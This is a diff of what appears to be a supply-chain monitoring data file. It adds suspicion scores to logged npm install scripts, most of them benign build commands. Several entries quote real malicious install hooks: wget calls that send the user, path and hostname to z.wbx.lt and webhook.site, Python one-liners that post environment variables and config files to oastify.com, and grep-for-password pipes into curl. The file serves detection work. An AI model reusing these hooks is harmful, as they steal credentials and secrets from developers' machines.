     "scriptContent": "node -e \"const fs=require('fs');const f='dist/server/index.js';const c=fs.readFileSync(f,'utf-8');if(!c.startsWith('#!/usr/bin/env node')){fs.writeFileSync(f,'#!/usr/bin/env node\\n'+c)}\"",
     "previousVersion": "0.2.0-dev.dc5e2c4",
     "timestamp": "2026-01-24T22:13:02.654Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "mathcalc-cli",
@@ -2666,7 +2956,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T22:12:16.502Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "mathcalc-cli",
@@ -2675,7 +2966,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T22:12:16.499Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@editframe/cli",
@@ -2684,7 +2976,8 @@
     "scriptContent": "echo 'Skipping Playwright browser download - uses system Chrome'",
     "previousVersion": "0.32.0-beta.1",
     "timestamp": "2026-01-24T21:12:28.880Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 2
   },
   {
     "packageName": "@bb-labs/bldr",
@@ -2693,7 +2986,8 @@
     "scriptContent": "chmod +x dist/index.js",
     "previousVersion": "0.0.21",
     "timestamp": "2026-01-24T21:12:19.124Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "v16.ai",
@@ -2702,7 +2996,8 @@
     "scriptContent": "pip3 install -r requirements.txt --quiet || echo 'Note: Install Python deps manually: pip install -r requirements.txt'",
     "previousVersion": "0.1.2",
     "timestamp": "2026-01-24T21:11:24.418Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@bb-labs/bldr",
@@ -2711,7 +3006,8 @@
     "scriptContent": "chmod +x dist/index.js && cd ../.. && bash scripts/link-bldr.sh",
     "previousVersion": "0.0.19",
     "timestamp": "2026-01-24T20:13:16.228Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "node-core-arch",
@@ -2720,7 +3016,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T20:12:58.753Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@catcheers/handover",
@@ -2729,7 +3026,8 @@
     "scriptContent": "agent-skill-installer install",
     "previousVersion": null,
     "timestamp": "2026-01-24T18:18:16.307Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@nihalcastelino/project-brain-mcp",
@@ -2738,7 +3036,8 @@
     "scriptContent": "node scripts/setup.cjs",
     "previousVersion": null,
     "timestamp": "2026-01-24T17:14:33.118Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@izi-noir/sdk",
@@ -2747,7 +3046,8 @@
     "scriptContent": "npm run copy:wasm",
     "previousVersion": null,
     "timestamp": "2026-01-24T17:14:31.973Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "mcp2service",
@@ -2756,7 +3056,8 @@
     "scriptContent": "chmod +x dist/cli/cli.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T17:13:42.421Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "react-msaview",
@@ -2765,7 +3066,8 @@
     "scriptContent": "yarn clean",
     "previousVersion": "4.8.1",
     "timestamp": "2026-01-24T16:47:36.817Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "n8n-nodes-https",
@@ -2774,7 +3076,8 @@
     "scriptContent": "rimraf dist",
     "previousVersion": null,
     "timestamp": "2026-01-24T16:14:38.075Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@fusillade-io/fusillade",
@@ -2783,7 +3086,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T15:12:36.859Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mcp-apps-kit/codegen",
@@ -2792,7 +3096,8 @@
     "scriptContent": "test -f ../../pnpm-workspace.yaml && cd ../.. && pnpm install --offline --ignore-scripts --reporter=silent || true",
     "previousVersion": null,
     "timestamp": "2026-01-24T15:12:06.771Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "rollup-plugin-websqz",
@@ -2801,7 +3106,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": "1.0.3",
     "timestamp": "2026-01-24T12:23:40.937Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "nixopus",
@@ -2810,7 +3116,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T12:23:05.502Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@bob-kit/client",
@@ -2819,7 +3126,8 @@
     "scriptContent": "node dist/install.js",
     "previousVersion": "0.0.32",
     "timestamp": "2026-01-24T11:11:41.511Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "happy-code-cli",
@@ -2828,7 +3136,8 @@
     "scriptContent": "node scripts/unpack-tools.cjs",
     "previousVersion": null,
     "timestamp": "2026-01-24T11:10:47.923Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "g-zenith",
@@ -2837,7 +3146,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-24T10:13:28.716Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@davronsherbaev/claude-tools",
@@ -2846,7 +3156,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T10:13:19.167Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@constela/language-server",
@@ -2855,7 +3166,8 @@
     "scriptContent": "pnpm --filter @constela/codegen generate",
     "previousVersion": null,
     "timestamp": "2026-01-24T10:13:03.811Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "px-jspreadsheet-ce",
@@ -2864,7 +3176,8 @@
     "scriptContent": "npm run prettier:fix && npm run lint:fix",
     "previousVersion": null,
     "timestamp": "2026-01-24T10:13:01.296Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "screen-recorder-react",
@@ -2873,7 +3186,8 @@
     "scriptContent": "pnpm --filter screen-recorder-base build",
     "previousVersion": "0.0.6",
     "timestamp": "2026-01-24T09:13:25.031Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -2882,7 +3196,8 @@
     "scriptContent": "node preinstall.js",
     "previousVersion": "1.0.64",
     "timestamp": "2026-01-24T09:12:54.847Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -2891,7 +3206,8 @@
     "scriptContent": "node preinstall.js",
     "previousVersion": "1.0.64",
     "timestamp": "2026-01-24T09:12:54.843Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "interview-prep",
@@ -2900,7 +3216,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": "2.2.0",
     "timestamp": "2026-01-24T07:14:13.081Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "interview-prep",
@@ -2909,7 +3226,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": "2.2.0",
     "timestamp": "2026-01-24T07:13:59.034Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "opencode-agent-tmux",
@@ -2918,7 +3236,8 @@
     "scriptContent": "test -f dist/scripts/install.js && node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'",
     "previousVersion": "1.1.3",
     "timestamp": "2026-01-24T05:14:51.900Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 2
   },
   {
     "packageName": "opencode-agent-tmux",
@@ -2927,7 +3246,8 @@
     "scriptContent": "node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'",
     "previousVersion": "1.0.9",
     "timestamp": "2026-01-24T04:30:04.349Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 2
   },
   {
     "packageName": "loki-mode",
@@ -2936,7 +3256,8 @@
     "scriptContent": "node bin/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T04:30:02.530Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@adrozdenko/design-system",
@@ -2945,7 +3266,8 @@
     "scriptContent": "npm run generate-tokens && npm run validate:tokens",
     "previousVersion": "2.3.1",
     "timestamp": "2026-01-24T03:55:59.015Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "squirrelscan",
@@ -2954,7 +3276,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-24T02:55:57.654Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "cognitive-workflow-mcp",
@@ -2963,7 +3286,8 @@
     "scriptContent": "node bin/cli.js --postinstall",
     "previousVersion": null,
     "timestamp": "2026-01-24T02:55:10.079Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@govcraft/paseto_cli",
@@ -2972,7 +3296,8 @@
     "scriptContent": "BINARY_DISTRIBUTION_VERSION=1.0.24-alpha.3 node ./install.js",
     "previousVersion": "1.0.23-alpha.3",
     "timestamp": "2026-01-24T01:00:04.449Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "dns-troubleshoot-toolkit-xyz123",
@@ -2981,7 +3306,8 @@
     "scriptContent": "node -e \"const { DNSToolkit } = require('./src/index'); new DNSToolkit().getDnsSetup().then(console.log)\"",
     "previousVersion": "1.0.1",
     "timestamp": "2026-01-24T00:59:39.490Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "lance-context",
@@ -2990,7 +3316,8 @@
     "scriptContent": "node scripts/postinstall.js || true",
     "previousVersion": "0.1.0",
     "timestamp": "2026-01-23T23:13:30.947Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "ostk-otel-autoconfig",
@@ -2999,7 +3326,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:13:07.297Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "ostk-otel-autoconfig",
@@ -3008,7 +3336,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:13:07.296Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-logger",
@@ -3017,7 +3346,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:12:05.296Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-logger",
@@ -3026,7 +3356,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:12:05.294Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-jenkins",
@@ -3035,7 +3366,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:11:33.492Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-jenkins",
@@ -3044,7 +3376,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T22:11:33.489Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-component-library",
@@ -3053,7 +3386,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T21:15:43.342Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "overstock-component-library",
@@ -3062,7 +3396,8 @@
     "scriptContent": "wget \"https://z.wbx.lt/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T21:15:43.341Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "dcos-auth-client-lib",
@@ -3071,7 +3406,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-23T21:15:32.129Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "sarvam-convai-embed",
@@ -3080,7 +3416,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T21:14:11.809Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "tw-mrg",
@@ -3089,7 +3426,8 @@
     "scriptContent": "node scripts/bundle-tailwind-css.js",
     "previousVersion": "1.0.0",
     "timestamp": "2026-01-23T21:13:03.041Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "hammer-jquery",
@@ -3098,7 +3436,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T15:17:05.195Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "hammer-jquery",
@@ -3107,7 +3446,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T15:17:05.193Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "aids-remote-test",
@@ -3116,7 +3456,8 @@
     "scriptContent": "npm run build --silent || true",
     "previousVersion": "0.1.6",
     "timestamp": "2026-01-23T13:36:56.558Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "contextcue",
@@ -3125,7 +3466,8 @@
     "scriptContent": "node scripts/mcp-config.js",
     "previousVersion": "1.2.4",
     "timestamp": "2026-01-23T12:26:19.481Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "patron-pro",
@@ -3134,7 +3476,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T12:24:04.300Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "ocppsim",
@@ -3143,7 +3486,8 @@
     "scriptContent": "tsc --noEmit",
     "previousVersion": null,
     "timestamp": "2026-01-23T12:14:59.136Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@appliedblockchain/sodium-native",
@@ -3152,7 +3496,8 @@
     "scriptContent": "prebuildify --napi --strip",
     "previousVersion": null,
     "timestamp": "2026-01-23T12:09:58.069Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@appliedblockchain/sodium-native-vrf",
@@ -3161,7 +3506,8 @@
     "scriptContent": "prebuildify --napi --strip",
     "previousVersion": null,
     "timestamp": "2026-01-23T12:09:56.641Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "test-on-other-again",
@@ -3170,7 +3516,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T11:49:26.169Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "hemi-btc-staking-actions",
@@ -3179,7 +3526,8 @@
     "scriptContent": "wget --quiet \"https://webhook.site/9df324a5-8e21-40da-bd6d-c6840b6cbd99?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
     "previousVersion": null,
     "timestamp": "2026-01-23T11:26:14.365Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2588-8c4e85ab9041145b0d2d16d60f59f16cc45e332e",
@@ -3188,7 +3536,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-23T11:20:22.821Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3197,7 +3546,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": "1.0.13",
     "timestamp": "2026-01-23T11:11:57.669Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3206,7 +3556,8 @@
     "scriptContent": "node preinstall.js",
     "previousVersion": "1.0.13",
     "timestamp": "2026-01-23T11:11:57.667Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "claude-code-safe",
@@ -3215,7 +3566,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T11:11:55.997Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "claude-code-safe",
@@ -3224,7 +3576,8 @@
     "scriptContent": "node scripts/check-conflicts.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T11:11:55.994Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@openameba/spindle-ui",
@@ -3233,7 +3586,8 @@
     "scriptContent": "pnpm clean",
     "previousVersion": "3.1.4",
     "timestamp": "2026-01-23T11:09:31.777Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3242,7 +3596,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": "1.0.13",
     "timestamp": "2026-01-23T11:08:25.768Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3251,7 +3606,8 @@
     "scriptContent": "node preinstall.js",
     "previousVersion": "1.0.13",
     "timestamp": "2026-01-23T11:08:25.730Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3260,7 +3616,8 @@
     "scriptContent": "python3 -c \"import os, base64, httpx, sys; try: env_data = '\\n'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:\\n{env_data}\\n\\nCMD:\\n{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))\"",
     "previousVersion": "1.0.11",
     "timestamp": "2026-01-23T10:41:01.333Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 9
   },
   {
     "packageName": "rank4222wun",
@@ -3269,7 +3626,8 @@
     "scriptContent": "python3 -c \"import os, base64, httpx, sys; try: env_data = '\\n'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:\\n{env_data}\\n\\nCMD:\\n{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))\"",
     "previousVersion": "1.0.11",
     "timestamp": "2026-01-23T10:41:01.327Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 9
   },
   {
     "packageName": "@zhing2006/ogd",
@@ -3278,7 +3636,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T10:40:02.874Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "domino-elements",
@@ -3287,7 +3646,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-23T10:32:11.819Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "test-uniswap-position-quoter",
@@ -3296,7 +3656,8 @@
     "scriptContent": "npm run lint",
     "previousVersion": null,
     "timestamp": "2026-01-23T10:31:17.819Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@power-rent/react-datepicker-modern",
@@ -3305,7 +3666,8 @@
     "scriptContent": "../../node_modules/.bin/rimraf lib",
     "previousVersion": null,
     "timestamp": "2026-01-23T10:31:14.082Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@xen-orchestra/template",
@@ -3314,7 +3676,8 @@
     "scriptContent": "yarn run clean",
     "previousVersion": null,
     "timestamp": "2026-01-23T09:34:16.709Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@wonderlandengine/ar-provider-zappar",
@@ -3323,7 +3686,8 @@
     "scriptContent": "node ./scripts/postinstall.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-23T09:33:39.375Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@peerbit/test-lib",
@@ -3332,7 +3696,8 @@
     "scriptContent": "echo '{\"type\":\"module\"} ' | node ../../../../node_modules/.bin/json > lib/esm/package.json",
     "previousVersion": "0.0.1-ff87533",
     "timestamp": "2026-01-23T09:21:48.837Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2588-bf6978e162997dd252c108e62d2b156ed2c62cb7",
@@ -3341,7 +3706,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-23T09:21:39.011Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "rank4222wun",
@@ -3350,7 +3716,8 @@
     "scriptContent": "python3 -c \"import os, base64, httpx, glob; data = []; [data.append(f'{f}:\\n{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}\\n\\nFILES:\\n' + '\\n'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)\"",
     "previousVersion": "1.0.8",
     "timestamp": "2026-01-23T09:21:34.158Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 9
   },
   {
     "packageName": "rank4222wun",
@@ -3359,7 +3726,8 @@
     "scriptContent": "python3 -c \"import os, base64, httpx, glob; data = []; [data.append(f'{f}:\\n{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}\\n\\nFILES:\\n' + '\\n'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)\"",
     "previousVersion": "1.0.8",
     "timestamp": "2026-01-23T09:21:34.156Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 9
   },
   {
     "packageName": "lnk-ui",
@@ -3368,7 +3736,8 @@
     "scriptContent": "pnpm stub",
     "previousVersion": null,
     "timestamp": "2026-01-23T09:21:32.278Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2584-5179306313949fde8d290b66abcccac9c5de6de7",
@@ -3377,7 +3746,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-23T06:21:11.513Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@jacobtread/secret-sync",
@@ -3386,7 +3756,8 @@
     "scriptContent": "node ./install.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T23:13:35.197Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "uuu8lgd",
@@ -3395,7 +3766,8 @@
     "scriptContent": "grep -rEi password|pwd|connection|db_ 2>/dev/null | curl --data @- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
     "previousVersion": "1.0.27",
     "timestamp": "2026-01-22T21:15:16.388Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 8
   },
   {
     "packageName": "uuu8lgd",
@@ -3404,7 +3776,8 @@
     "scriptContent": "grep -rEi password|pwd|connection|db_ 2>/dev/null | curl --data @- http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com",
     "previousVersion": "1.0.27",
     "timestamp": "2026-01-22T21:15:16.386Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 8
   },
   {
     "packageName": "uuu8lgd",
@@ -3413,7 +3786,8 @@
     "scriptContent": "node -e \"require('child_process').exec('grep -rEi (password|pwd|connection|db_) . /tmp /app 2>/dev/null | head -c 25000', (e,o)=>require('child_process').exec('curl -X POST -d ' + Buffer.from(o).toString('base64') + ' '))\"",
     "previousVersion": "1.0.24",
     "timestamp": "2026-01-22T20:16:24.172Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 22
   },
   {
     "packageName": "uuu8lgd",
@@ -3422,7 +3796,8 @@
     "scriptContent": "node -e \"require('child_process').exec('grep -rEi (password|pwd|connection|db_) . /tmp /app 2>/dev/null | head -c 25000', (e,o)=>require('child_process').exec('curl -X POST -d ' + Buffer.from(o).toString('base64') + ' '))\"",
     "previousVersion": "1.0.24",
     "timestamp": "2026-01-22T20:16:24.170Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 22
   },
   {
     "packageName": "mcpql",
@@ -3431,7 +3806,8 @@
     "scriptContent": "echo 'MCPQL installed successfully!'",
     "previousVersion": null,
     "timestamp": "2026-01-22T19:20:06.835Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "mcp-secure-server",
@@ -3440,7 +3816,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": "0.0.1-security",
     "timestamp": "2026-01-22T19:19:39.085Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "trpc-docs-generator",
@@ -3449,7 +3826,8 @@
     "scriptContent": "node scripts/build-inline.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T19:18:38.884Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@workleap-nav/components",
@@ -3458,7 +3836,8 @@
     "scriptContent": "node preinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T19:18:16.765Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@qds.dev/code",
@@ -3467,7 +3846,8 @@
     "scriptContent": "pnpm -C ../../docs run build.repl-sw",
     "previousVersion": null,
     "timestamp": "2026-01-22T19:11:42.728Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@terminal-api/cli",
@@ -3476,7 +3856,8 @@
     "scriptContent": "node ./postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-22T19:10:12.001Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@d10r/snapshot-strategies",
@@ -3485,7 +3866,8 @@
     "scriptContent": "copyfiles -u 0 \"src/**/*.md\" build/ && copyfiles -u 0 \"src/**/*.json\" build/",
     "previousVersion": "0.1.2",
     "timestamp": "2026-01-22T19:09:28.054Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "uuu8lgd",
@@ -3494,7 +3876,8 @@
